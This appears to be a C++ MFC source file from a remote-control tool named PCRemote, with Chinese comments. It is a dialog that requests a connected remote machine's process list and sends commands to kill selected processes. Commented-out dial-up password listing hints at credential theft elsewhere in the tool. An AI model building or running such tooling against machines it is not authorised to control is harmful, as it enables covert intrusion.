// SystemDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PCRemote.h"
#include "SystemDlg.h"
#include "afxdialogex.h"
#include "../thirdpart/macros.h"

// CSystemDlg 对话框

IMPLEMENT_DYNAMIC(CSystemDlg, CDialogEx)

CSystemDlg::CSystemDlg(CWnd* pParent /*= NULL*/, CIOCPServer* pIOCPServer /*= NULL*/, ClientContext *pContext /*= NULL*/)
	: CDialogEx(IDD_SYSTEM_DIALOG, pParent), m_iocpServer(pIOCPServer), m_pContext(pContext)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));
}

CSystemDlg::~CSystemDlg()
{
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TAB_SYS, m_sysTab);
	DDX_Control(pDX, IDC_LIST_SYS_WINDOWS, m_list_SysWindows);
	DDX_Control(pDX, IDC_LIST_SYS_PROCESS, m_list_sysProcess);
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB_SYS, &CSystemDlg::OnTcnSelchangeTabSys)
	ON_COMMAND(ID_PROCESSLIST_KILL_PROCESS, &CSystemDlg::OnProcesslistKillProcess)
	ON_COMMAND(ID_PROCESSLIST_REFRESH_PROCESSLIST, &CSystemDlg::OnProcesslistRefreshProcesslist)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SYS_PROCESS, &CSystemDlg::OnNMRClickListSysProcess)
END_MESSAGE_MAP()


// CSystemDlg 消息处理程序
BOOL CSystemDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	initDialog();

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CSystemDlg::initDialog()
{
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen); //得到连接的ip 
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);//设置对话框标题

	m_sysTab.InsertItem(0, "进程管理");    //为tab设置标题
	m_sysTab.InsertItem(1, "窗口管理");
//	m_sysTab.InsertItem(2, "拨号密码");

	m_list_sysProcess.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化进程的列表
	m_list_sysProcess.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
	m_list_sysProcess.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_sysProcess.InsertColumn(2, "程序路径", LVCFMT_LEFT, 400);

	m_list_SysWindows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //初始化 窗口管理的列表
	m_list_SysWindows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
	m_list_SysWindows.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);


	AdjustList();       //各个列表的大小
	ShowProcessList();   //由于第一个发送来的消息后面紧跟着进程的数据所以把数据显示到列表当中
	ShowSelectWindow();   //显示列表
}

void CSystemDlg::ShowProcessList(void)
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	DWORD	dwOffset = 0;
	CString str;
	m_list_sysProcess.DeleteAllItems();
	//遍历发送来的每一个字符别忘了他的数据结构啊 Id+进程名+0+完整名+0
	int i = 0;
	UINT bufLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	for (i = 0; dwOffset < bufLen; ++i)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);        //这里得到进程ID
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);      //进程名就是ID之后的啦
		int strExeFileLen = lstrlen(strExeFile);
		strProcessName = strExeFile + strExeFileLen + 1;  //完整名就是进程名之后的啦
		//他的数据结构的构建很巧妙
		m_list_sysProcess.InsertItem(i, strExeFile);       //将得到的数据加入到列表当中
		str.Format("%5u", *lpPID);
		m_list_sysProcess.SetItemText(i, 1, str);
		m_list_sysProcess.SetItemText(i, 2, strProcessName);
		// ItemData 为进程ID
		m_list_sysProcess.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) + strExeFileLen + lstrlen(strProcessName) + 2;   //跳过这个数据结构 进入下一个循环
	}

	str.Format("程序路径 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_sysProcess.SetColumn(2, &lvc); //在列表中显示有多少个进程
}

void CSystemDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialogEx::OnClose();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	AdjustList();
}

void CSystemDlg::AdjustList(void)
{
	if (NULL == m_list_SysWindows.m_hWnd || NULL == m_list_sysProcess.m_hWnd)
	{
		return;
	}

	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 29;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	m_list_sysProcess.MoveWindow(&rectList);
	m_list_SysWindows.MoveWindow(&rectList);
}


void CSystemDlg::OnTcnSelchangeTabSys(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	ShowSelectWindow();

	*pResult = 0;
}

void CSystemDlg::ShowSelectWindow(void)
{
	switch (m_sysTab.GetCurSel())
	{
	case 0:
	{
		m_list_SysWindows.ShowWindow(SW_HIDE);
		m_list_sysProcess.ShowWindow(SW_SHOW);
		if (m_list_sysProcess.GetItemCount() == 0)
		{
			GetProcessList();
		}
	}
		break;
	case 1:
	{
		m_list_sysProcess.ShowWindow(SW_HIDE);
		m_list_SysWindows.ShowWindow(SW_SHOW);		
		if (m_list_SysWindows.GetItemCount() == 0)
		{
			//GetWindowsList();
		}		
	}	
			break;
	default:
		break;
	}
}

void CSystemDlg::GetProcessList(void)
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}




void CSystemDlg::OnProcesslistKillProcess()
{
	// TODO: 在此添加命令处理程序代码
	CListCtrl	*pListCtrl = NULL;
	if (m_list_sysProcess.IsWindowVisible())
	{
		pListCtrl = &m_list_sysProcess;
	}		
	else if (m_list_SysWindows.IsWindowVisible())
	{
		pListCtrl = &m_list_SysWindows;
	}		
	else
	{
		return;
	}		

	// TODO: Add your command handler code here
	//非配缓冲区
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	//加入结束进程的数据头
	lpBuffer[0] = COMMAND_KILLPROCESS;
	//显示警告信息
	char *lpTips = "警告: 终止进程会导致不希望发生的结果，\n"
		"包括数据丢失和系统不稳定。在被终止前，\n"
		"进程将没有机会保存其状态和数据。";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%s确实\n想终止这%d项进程吗?", lpTips, pListCtrl->GetSelectedCount());
	}
	else
	{
		str.Format("%s确实\n想终止该项进程吗?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "进程结束警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
	{
		return;
	}		

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	//得到要结束哪个进程
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	//发送数据到服务端到服务端查找COMMAND_KILLPROCESS这个数据头
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CSystemDlg::OnProcesslistRefreshProcesslist()
{
	// TODO: 在此添加命令处理程序代码
	if (m_list_sysProcess.IsWindowVisible())
	{
		GetProcessList();
	}
		
	if (m_list_SysWindows.IsWindowVisible())
	{
//		GetWindowsList();
	}	
}


void CSystemDlg::OnNMRClickListSysProcess(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_PROCESS);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}

void CSystemDlg::OnReceiveComplete(void)
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
		//case TOKEN_WSLIST:
		//ShowWindowsList();
		//break;
		//case TOKEN_DIALUPASS:
		//ShowDialupassList();
		//break;
	default:
		// 传输发生异常数据
		break;
	}
}